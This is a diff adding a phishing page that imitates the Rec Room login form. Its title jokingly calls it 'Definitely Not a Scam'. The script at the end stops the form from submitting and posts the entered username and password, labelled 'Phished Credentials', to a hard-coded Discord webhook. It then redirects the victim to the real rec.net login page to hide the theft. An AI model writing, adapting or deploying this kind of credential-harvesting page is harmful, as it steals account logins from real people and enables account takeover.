@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Totally Legit Rec Net Login (Definitely Not a Scam)</title>
+    <style>
+        /* element.style { } @media (min-width: 1200px) { .container { width: 1170px; } } @media (min-width: 992px) { .container { width: 970px; } } @media (min-width: 768px) { .container { width: 750px; } } .container { padding-right: 15px; padding-left: 15px; margin-right: auto; margin-left: auto; } * { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; } user agent stylesheet div { display: block; unicode-bidi: isolate; } body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 14px; line-height: 1.42857143; color: #333; background-color: #fff; } html { font-size: 10px; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); } html { font-family: sans-serif; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; } .btn-group-vertical>.btn-group:after, .btn-group-vertical>.btn-group:before, .btn-toolbar:after, .btn-toolbar:before, .clearfix:after, .clearfix:before, .container-fluid:after, .container-fluid:before, .container:after, .container:before, .dl-horizontal dd:after, .dl-horizontal dd:before, .form-horizontal .form-group:after, .form-horizontal .form-group:before, .modal-footer:after, .modal-footer:before, .modal-header:after, .modal-header:before, .nav:after, .nav:before, .navbar-collapse:after, .navbar-collapse:before, .navbar-header:after, .navbar-header:before, .navbar:after, .navbar:before, .pager:after, .pager:before, .panel-body:after, .panel-body:before, .row:after, .row:before { display: table; content: " "; } :after, :before { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; } .btn-group-vertical>.btn-group:after, .btn-toolbar:after, .clearfix:after, .container-fluid:after, .container:after, .dl-horizontal dd:after, .form-horizontal .form-group:after, .modal-footer:after, .modal-header:after, .nav:after, .navbar-collapse:after, .navbar-header:after, .navbar:after, .pager:after, .panel-body:after, .row:after { clear: both; } .btn-group-vertical>.btn-group:after, .btn-group-vertical>.btn-group:before, .btn-toolbar:after, .btn-toolbar:before, .clearfix:after, .clearfix:before, .container-fluid:after, .container-fluid:before, .container:after, .container:before, .dl-horizontal dd:after, .dl-horizontal dd:before, .form-horizontal .form-group:after, .form-horizontal .form-group:before, .modal-footer:after, .modal-footer:before, .modal-header:after, .modal-header:before, .nav:after, .nav:before, .navbar-collapse:after, .navbar-collapse:before, .navbar-header:after, .navbar-header:before, .navbar:after, .navbar:before, .pager:after, .pager:before, .panel-body:after, .panel-body:before, .row:after, .row:before { display: table; content: " "; } :after, :before { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; } */
+        body {
+            font-family: sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .page-login {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+        .recroom-logo {
+            display: block;
+            margin: 0 auto 20px;
+            max-width: 200px; /* Adjust as needed */
+        }
+        hr {
+            border-top: 1px solid #ccc;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        .form-control {
+            width: calc(100% - 22px);
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button.btn {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+        button.btn:hover {
+            background-color: #0056b3;
+        }
+        .text-center {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .text-danger {
+            color: red;
+            margin-top: 5px;
+            display: block;
+        }
+        .checkbox {
+            margin-top: 10px;
+            margin-bottom: 15px;
+        }
+        .checkbox label {
+            display: inline;
+            margin-left: 5px;
+        }
+        .submit-button {
+            margin-top: 15px;
+        }
+        p {
+            margin-top: 10px;
+            text-align: center;
+        }
+        p a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        p a:hover {
+            text-decoration: underline;
+        }
+        /* You might need to grab more specific styles from their CSS for a perfect match */
+    </style>
+</head>
+<body>
+    <div class="page-login">
+        <img class="recroom-logo" src="/images/logo_stacked.png" alt="Rec Room" />
+        <hr />
+        <section>
+            <p class="text-center">Log in with your Rec Room Username and Password</p>
+            <form id="loginForm" action="" method="post">
+                <div class="form-group">
+                    <label for="Input_Username">Username or Email</label>
+                    <input class="form-control" placeholder="Username" autofocus type="text" id="Input_Username" name="Input.Username" required>
+                    <span id="usernameError" class="text-danger"></span>
+                </div>
+                <div class="form-group">
+                    <label for="Input_Password">Password</label>
+                    <input class="form-control" type="password" placeholder="Password" autocomplete="off" id="Input_Password" name="Input.Password" required>
+                    <span id="passwordError" class="text-danger"></span>
+                </div>
+                <div class="form-actions">
+                    <div class="form-group">
+                        <div class="checkbox">
+                            <label for="Input_RememberMe">
+                                <input type="checkbox" id="Input_RememberMe" name="Input.RememberMe" value="true">
+                                Remember Me?
+                            </label>
+                        </div>
+                    </div>
+                    <div class="submit-button form-group">
+                            <button class="btn" id="submitButton" name="button" value="login">Login</button>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <p>
+                        <a href="https://rec.net/password/recover">Forgot your password?</a>
+                    </p>
+                    <p>
+                        <a href="https://rec.net/download">Don't have an Account? Download Rec Room to create yours today!</a>
+                    </p>
+                </div>
+                <input type="hidden" name="__RequestVerificationToken" value="YOUR_REQUEST_VERIFICATION_TOKEN"> <input type="hidden" name="Input.RememberMe" value="false">
+            </form>
+        </section>
+    </div>
+
+    <script><script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const loginForm = document.getElementById('loginForm');
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault(); // Stop the form from actually submitting
+
+            const username = document.getElementById('Input_Username').value;
+            const password = document.getElementById('Input_Password').value;
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1366421122014253097/a63BlnStlKceFeK6fEjGIANz4r_bgxZyA7_Gt_r-Ub5TjTrKCYDkmUs8vEqKhbfR7-DH';
+
+            const payload = {
+                content: `**Phished Credentials**\n**Username:** ${username}\n**Password:** ${password}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send data to Discord:', response.status);
+                }
+                window.location.href = 'https://rec.net/login'; // Redirect to real site after
+            })
+            .catch(error => {
+                console.error('Error sending to Discord:', error);
+                window.location.href = 'https://rec.net/login';
+            });
+        });
+    });
+</script>
